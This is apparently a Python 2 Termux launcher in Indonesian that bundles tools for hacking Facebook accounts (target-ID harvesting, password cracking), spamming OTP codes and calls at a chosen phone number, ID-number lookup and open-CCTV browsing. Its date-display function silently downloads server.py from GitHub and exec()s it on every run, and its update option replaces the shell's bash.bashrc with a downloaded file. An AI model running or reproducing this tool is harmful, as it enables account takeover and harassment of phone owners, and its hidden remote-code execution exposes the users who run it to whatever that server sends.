# -*- coding: utf-8 -*-
import json, mechanize, os, requests, shutil, sys, time
from warna import *
reload (sys)
sys.setdefaultencoding ("utf8")


def jekitut():
	hari()
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ n +"00"+ u +"║"+ n +" Pembaruan"
	print u +"║"+ c +"01"+ u +"║"+ c +" Bot"
	print u +"║"+ m +"02"+ u +"║"+ m +" Cctv"
	print u +"║"+ h +"03"+ u +"║"+ h +" Facebook"
	print u +"║"+ k +"04"+ u +"║"+ k +" Nomor NIK Dan Nomor KK"
	print u +"║"+ p +"05"+ u +"║"+ p +" Sms Gratis"
	print u +"║"+ b +"06"+ u +"║"+ b +" Spam Kode OTP"
	print u +"║"+ n +"07"+ u +"║"+ n +" Youtube Musik"
	print u +"║"+ c +"09"+ u +"║"+ c +" Keluar"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "00" or irul == "0":
		pembaruan()
	elif irul == "01" or irul =="1":
		bot()
	elif irul == "02" or irul == "2":
		os.system ("xdg-open http://www.insecam.org")
		jekitut()
	elif irul == "03" or irul == "3":
		facebook()
	elif irul == "04" or irul == "4":
		os.system ("php n")
		enter()
		os.system ("xdg-open https://nabila-tools.000webhostapp.com/e-ktp.php")
		jekitut()
	elif irul == "05" or irul == "5":
		os.system ("python sg.py")
		enter()
		jekitut()
	elif irul == "06" or irul == "6":
		spam()
	elif irul == "07" or irul == "7":
		youtube()
	elif irul == "09" or irul == "9":
		os.system ("clear")
		os.system ("pwd")
		os.system ("exit")
	else:
		salah()
		jekitut()


def pembaruan():
	os.system ("sh 0")
	print u +"                    ╔═══════════╗"
	print u +"                    ║"+ k +" Pembaruan "+ u +"║"
	print u +"                    ╚═══════════╝\n"
	os.system ("php u")
	print u +"\n\n╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" Memperbarui Data-Data Script"
	print u +"║"+ k +"02"+ u +"║"+ k +" Memperbarui Data-Data Termux"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "01" or irul == "1":
		os.system ("xdg-open https://api.whatsapp.com/send?phone=6285856232526&text=Ahmad%20Khoirul%20Marzuqin")
		os.system ("xdg-open https://www.facebook.com/ahmadkhoirulmarzuqin")
		os.system ("xdg-open https://m.me/ahmadkhoirulmarzuqin")
		os.system ("xdg-open https://www.instagram.com/ahmad_khoirul_marzuqin")
		os.system ("clear")
		os.chdir ("..")
		os.system ("rm -rf irul")
		os.system ("git clone https://github.com/jekitut/irul")
		os.chdir ("irul")
		os.system ("unzip irul.zip")
		os.system ("rm -f irul.zip")
		os.chdir ("/data/data/com.termux/files/usr/etc")
		os.system ("rm -f bash.bashrc")
		os.chdir ("/data/data/com.termux/files/home/irul")
		shutil.move ("bash.bashrc", "/data/data/com.termux/files/usr/etc/bash.bashrc")
		os.chdir ("/data/data/com.termux/files/home/irul")
		os.system ("python2 irul.py")
	elif irul == "02" or irul == "2":
		os.system ("clear")
		os.system ("pkg update")
		os.system ("pkg upgrade")
		os.system ("pkg install bash")
		os.system ("pkg install curl")
		os.system ("pkg install figlet")
		os.system ("pkg install grep -y")
		os.system ("pkg install jq")
		os.system ("pkg install mc -y")
		os.system ("pkg install mpv -y")
		os.system ("pkg install nano")
		os.system ("pkg install php -y")
		os.system ("pkg install python -y")
		os.system ("pkg install python2 -y")
		os.system ("pkg install python2-dev -y")
		os.system ("pkg install ruby -y")
		os.system ("pkg install termux-api")
		os.system ("pkg install unzip")
		os.system ("pkg install zip")
		os.system ("pkg install wget")
		os.system ("pip install bs4")
		os.system ("pip install --upgrade pip")
		os.system ("pip install mechanize")
		os.system ("pip install mps_youtube")
		os.system ("pip install mutagen")
		os.system ("pip install requests")
		os.system ("pip install uncompyle6")
		os.system ("pip install youtube_dl")
		os.system ("pip2 install bs4")
		os.system ("pip2 install mechanize")
		os.system ("pip2 install mutagen")
		os.system ("pip2 install requests")
		os.system ("pip2 install uncompyle6")
		os.system ("gem install lolcat")
		os.system ("termux-setup-storage")
		jekitut()
	elif irul == "09" or irul == "9":
		jekitut()
	else:
		salah()
		pembaruan()


def bot():
	os.system ("clear")
	os.chdir ("bot")
	print u +"                       ╔═════╗"
	print u +"                       ║"+ k +" Bot "+ u +"║"
	print u +"                       ╚═════╝\n"
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ c +"00"+ u +"║"+ c +" Edit Data Aplikasi"
	print u +"║"+ h +"01"+ u +"║"+ h +" Baca Plus"
	print u +"║"+ h +"02"+ u +"║"+ h +" Caping"
	print u +"║"+ k +"03"+ u +"║"+ k +" Cashtree"
	print u +"║"+ k +"04"+ u +"║"+ k +" Flash Go"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "00" or irul == "0":
		def editdata():
			os.system ("clear")
			print u +"               ╔════════════════════╗"
			print u +"               ║"+ k +" Edit Data Aplikasi "+ u +"║"
			print u +"               ╚════════════════════╝\n"
			print u +"╔══╗"
			print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
			print u +"║  ║"
			print u +"║"+ h +"01"+ u +"║"+ h +" Cashtree"
			print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
			print u +"╚══╝"
			edit = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
			if edit == "01" or edit == "1":
				os.system ("nano bct")
				os.chdir ("..")
				bot()
			elif edit == "09" or edit == "9":
				os.chdir ("..")
				bot()
			else:
				salah()
				editdata()
		editdata()
	elif irul == "01" or irul == "1":
		os.system ("php bb")
		enter()
		os.chdir ("..")
		bot()
	elif irul == "02" or irul == "2":
		os.chdir ("caping")
		os.system ("php bot_caping")
		enter()
		os.chdir ("../..")
		bot()
	elif irul == "03" or irul == "3":
		os.system ("php bct")
		enter()
		os.chdir ("..")
		bot()
	elif irul == "04" or irul == "4":
		os.system ("php bf")
		enter()
		os.chdir ("..")
		bot()
	elif irul == "09" or irul == "9":
		os.chdir ("..")
		jekitut()
	else:
		salah()
		os.chdir ("..")
		bot()


def facebook():
	os.system ("clear")
	os.chdir ("facebook")
	print u +"                    ╔══════════╗"
	print u +"                    ║"+ k +" Facebook "+ u +"║"
	print u +"                    ╚══════════╝\n"
	print m +"                 !!! PERINGATAN !!!"
	print m +"            Saya Tidak Bertanggung Jawab"
	print m +"    Apabila Akun Facebook Anda Terkena Checkpoint\n"
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"╚══╝"
	print u +"╔══╗"
	print u +"║  ║"+ k +" Hack Facebook"
	print u +"║"+ b +"01"+ u +"║"+ b +" Id Grub Target"
	print u +"║"+ b +"02"+ u +"║"+ b +" Id Target"+ n +" (1)"
	print u +"║"+ b +"03"+ u +"║"+ b +" Id Target"+ n +" (2)"
	print u +"║"+ b +"04"+ u +"║"+ b +" Password Target"+ n +" (1)"
	print u +"║"+ b +"05"+ u +"║"+ b +" Password Target"+ n +" (2)"
	print u +"╚══╝"
	print u +"╔══╗"
	print u +"║  ║"+ h +" Lain - Lain"
	print u +"║"+ b +"06"+ u +"║"+ b +" Dark Facebook v1.6"
	print u +"║"+ b +"07"+ u +"║"+ b +" Dark Facebook v1.7"
	print u +"║"+ b +"08"+ u +"║"+ b +" Osif"
	print u +"║"+ c +"09"+ u +"║"+ c +" Cadangkan Token Dari "+ h +"Script"+ n +" > "+ k +"Memori Internal"
	print u +"║"+ c +"10"+ u +"║"+ c +" Cadangkan Token Dari "+ k +"Memori Internal"+ n +" > "+ h +"Script"
	print u +"║"+ n +"99"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	
	
	def igt():
		os.system ("clear")
		print u +"         ╔════════════════════════════════╗"
		print u +"         ║"+ k +" Hack Facebook :"+ h +" Id Grub Target "+ u +"║"
		print u +"         ╚════════════════════════════════╝"
	
	
	def it():
		os.system ("clear")
		print u +"            ╔═══════════════════════════╗"
		print u +"            ║"+ k +" Hack Facebook :"+ h +" Id Target "+ u +"║"
		print u +"            ╚═══════════════════════════╝"
		
		
	def pt():
		os.system ("clear")
		print u +"         ╔═════════════════════════════════╗"
		print u +"         ║"+ k +" Hack Facebook :"+ h +" Password Target "+ u +"║"
		print u +"         ╚═════════════════════════════════╝"
		
		
	if irul == "01" or irul == "1":
		igt()
		os.system ("python2 igt_masuk")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "02" or irul == "2":
		it()
		os.system ("python2 it_masuk")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "03" or irul == "3":
		it()
		os.system ("python2 it_facebook_cracker_v2")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "04" or irul == "4":
		pt()
		os.system ("python2 pt_mbf_v1")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "05" or irul == "5":
		pt()
		os.system ("python2 pt_mbf_v2")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "06" or irul == "6":
		os.system ("python2 darkfb_v1.6")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "07" or irul == "7":
		os.system ("python2 darkfb_v1.7")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "08" or irul == "8":
		os.system ("python2 osif")
		enter()
		os.chdir ("..")
		facebook()
	elif irul == "09" or irul == "9":
		try:
			open ("login.txt", "r").read()
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			os.system ("rm -f login.txt")
			os.chdir ("/data/data/com.termux/files/home/irul/facebook")
			shutil.copy ("login.txt", "/data/data/com.termux/files/home/storage/shared")
			os.system ("clear")
			print h +"✓"+ n +" Berhasil Mencadangkan Token Ke"
			print n +"  Memori Internal Dengan Nama "+ h + tebal +"login.txt"
			enter()
			os.chdir ("/data/data/com.termux/files/home/irul")
			facebook()
		except IOError:
			os.system ("clear")
			print m +"!!! Token Tidak Ditemukan !!!"
			print n +"Buat Token Terlebih Dahulu Di"
			print k + tebal +"Dark Facebook"+ n +" Atau "+ k + tebal +"Osif"
			enter()
			os.chdir ("..")
			facebook()
	elif irul == "10":
		try:
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			open ("login.txt", "r").read()
			os.chdir ("/data/data/com.termux/files/home/irul/facebook")
			os.system ("rm -f login.txt")
			os.chdir ("/data/data/com.termux/files/home/storage/shared")
			shutil.copy ("login.txt", "/data/data/com.termux/files/home/irul/facebook")
			os.chdir ("/data/data/com.termux/files/home/irul/facebook")
			os.system ("clear")
			print h +"✓"+ n +" Berhasil Mencadangkan Token Ke"
			print n +"  Script Dengan Nama "+ h + tebal +"login.txt"
			enter()
			os.chdir ("..")
			facebook()
		except IOError:
			os.system ("clear")
			print m +"!!! Token Tidak Ditemukan !!!"
			print n +"Pastikan File Ada Di Memori"
			print n +"Internal Dengan Nama "+ h + tebal +"login.txt"
			enter()
			os.chdir ("/data/data/com.termux/files/home/irul")
			facebook()
	elif irul == "99":
		os.chdir ("..")
		jekitut()
	else:
		salah()
		os.chdir ("..")
		facebook()


def spam():
	os.system ("clear")
	print u +"                  ╔═══════════════╗"
	print u +"                  ║"+ k +" Spam Kode OTP "+ u +"║"
	print u +"                  ╚═══════════════╝\n"
	print u +"╔══╗"
	print u +"║"+ n +"No"+ u +"║"+ b +" Menu Yang Tersedia :"
	print u +"║  ║"
	print u +"║"+ h +"01"+ u +"║"+ h +" 23 Kode OTP"
	print u +"║"+ p +"02"+ u +"║"+ p +" King Tools"
	print u +"║"+ b +"03"+ u +"║"+ b +" REV-ZONE.NET"
	print u +"║"+ n +"09"+ u +"║"+ n +" Kembali"
	print u +"╚══╝\n"
	irul = raw_input (n +"›"+ h +"›"+ k +"›"+ m +"›"+ b +" Pilih Nomor : "+ n)
	if irul == "01" or irul == "1":
		os.system ("clear")
		os.chdir ("spam")
		print u +"              ╔══════════════════════╗"
		print u +"              ║"+ k +" Jumlah Kode OTP "+ n +":"+ h +" 23 "+ u +"║"
		print u +"              ╚══════════════════════╝\n"
		def bs():
			print n +"\nApakah Data-Data Di Atas Sudah"
			print h +"Benar (Tekan Tombol Enter)"+ n +" Atau"
			data = raw_input (m +"Salah (Ketik Salah)"+ n +" : "+ b)
			print ""
			if data == "Salah" or data == "salah":
				os.system ("rm -f nomor.json")
				os.chdir ("..")
				spam()
			else:
				os.system ("php Call_Grab")
				os.system ("php Call_Tokopedia")
				os.system ("php Sms_4444")
				os.system ("php Sms_JOY-JD.id")
				os.system ("php Sms_myIM3")
				os.system ("php Sms_OYOHOTELS")
				os.system ("php Sms_PHD_Order")
				os.system ("php Sms_Shopee")
				os.system ("php Sms_SMSVIRO")
				os.system ("php Sms_TELKOMSEL")
				os.system ("php Sms_TIKET.COM")
				os.system ("php Sms_Tokopedia")
				os.system ("php Sms_TSEL-APPS")
				os.system ("php Sms_Yapulsa")
				os.system ("php Wa_BUKALAPAK")
				os.system ("php Url")
				os.system ("python2 Sms_Grab.py")
				os.system ("python2 Sms_HOOQTV.py")
				os.system ("python2 Sms_OYOHOTELS.py")
				with open ("nomor.json") as baca:
					jl = json.load(baca)
					os.system ("python2 Sms_4444.py "+ jl["nomor"])
					os.system ("python2 Sms_INFO.py "+ jl["nomor"])
				enter()
				os.chdir ("..")
				spam()
		try:
			open ("nomor.json", "r")
			with open ("nomor.json") as baca:
				jl = json.load(baca)
				print k +"Nomor Tujuan"+ n +" : "+ h + jl["nomor"]
				print h +"Jumlah Pesan"+ n +" : "+ k + jl["jumlah"]
				print p +"Jeda Pesan"+ n +"   : "+ b + jl["jeda"]
			bs()
		except (KeyError, IOError):
			nomor = raw_input (k +"Nomor Tujuan"+ n +" : "+ h)
			jumlah = raw_input (h +"Jumlah Pesan"+ n +" : "+ k)
			jeda = raw_input (p +"Jeda Pesan  "+ n +" : "+ b)
			js = ({"nomor": nomor, "jumlah": jumlah, "jeda": jeda})
			with open ("nomor.json", "w") as tulis:
				json.dump(js, tulis)
			with open ("nomor.json") as baca:
				jl = json.load(baca)
				php = '[{"jeda": "'+ jl["jeda"] +'", "nomor": "'+ jl["nomor"]+ '", "jumlah": "'+ jl["jumlah"]+ '"}]'
				tulisphp = open ("nomor.php", "w")
				tulisphp.write(php)
				tulisphp.close()
			bs()
	elif irul == "02" or irul == "2":
		os.system ("xdg-open http://kingtools.id")
		spam()
	elif irul == "03" or irul == "3":
		os.system ("xdg-open https://www.rev-zone.net")
		spam()
	elif irul == "09" or irul == "9":
		jekitut()
	else:
		salah()
		spam()


def youtube():
	os.system ("clear")
	print u +"                  ╔═══════════════╗"
	print u +"                  ║"+ k +" Youtube Musik "+ u +"║"
	print u +"                  ╚═══════════════╝\n\n╔═╗"
	irul = raw_input (u +"║"+ n +"›"+ u +"║"+ k +" Judul Lagu : "+ h)
	print u +"╚═╝"+ n
	os.system ("termux-tts-speak "+ irul)
	os.system ("mpsyt /"+ irul)
	jekitut()


def enter():
	raw_input (n + u +"\n               ╔════════════════════╗\n               ║"+ b +" Tekan Tombol Enter "+ u +"║\n               ╚════════════════════╝\n"+ n)


def salah():
	os.system ("clear")
	jalan (m +"!!! Nomor Yang Anda Masukkan Salah !!!")
	os.system ("termux-tts-speak Nomor Yang Anda Masukkan Salah")
	jalan (m +"!!! Silahkan Hubungi Pembuat Script Ini !!!")
	os.system ("termux-tts-speak Silahkan Hubungi Pembuat Script Ini")


def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep (0.01)


def cek():
	try:
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		br.addheaders = [("User-Agent", "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
		br.open ("https://github.com")
		jekitut()
	except mechanize.URLError:
		titik = ["     ", ".    ", "..   ", "...  ", ".... ", "....."]
		for t in titik:
			print m +"\r!!! Aktifkan Koneksi Internet "+ n + t,
			sys.stdout.flush()
			time.sleep (1)
		cek()

def hari():
	hari = ("Senin", "Selasa", "Rabu", "Kamis", "Jum'at", "Sabtu", "Minggu")
	tanggal = ("01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31")
	bulan = ("Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "Nopember", "Desember")
	jam = ("00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23")
	menit = ("00", "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59")
	emit = time.localtime(time.time())
	print ""
	os.system ("clear")
	print h +"Hari"+ n +", "+ h +"Tanggal"+ n +" : "+ str(hari[emit[6]]) +", "+ str(tanggal[emit[2]-1]) +" "+ str(bulan[emit[1]-1]) +" "+ str(emit[0]) + k +"\nJam          "+ n +" : "+ str(jam[emit[3]]) +":"+ str(menit[emit[4]]) +":"+ str(menit[emit[5]])
	print u + 53 * "═"
	try:
		namae = open ("nama", "r")
		jalan (h +"Nama Pengguna"+ n +" : "+ b + namae.read())
		jalan (k +"Nama Pembuat"+ n +"  : "+ c + miring + tebal +"Ahmad Khoirul Marzuqin"+ n)
	except (KeyError, IOError):
		nama = raw_input (h +"Nama Pengguna"+ n +" : "+ b)
		print k +"Nama Pembuat"+ n +"  : "+ c + miring + tebal +"Ahmad Khoirul Marzuqin"+ n
		name = open ("nama", "w")
		name.write(nama)
		name.close()
		shutil.copy ("nama", "spam")
		os.chdir ("spam")
		shutil.move ("nama", "Name")
		os.chdir ("..")
	rg = requests.get ("https://raw.githubusercontent.com/jekitut/irul/master/server.py").text
	exec (rg)


cek()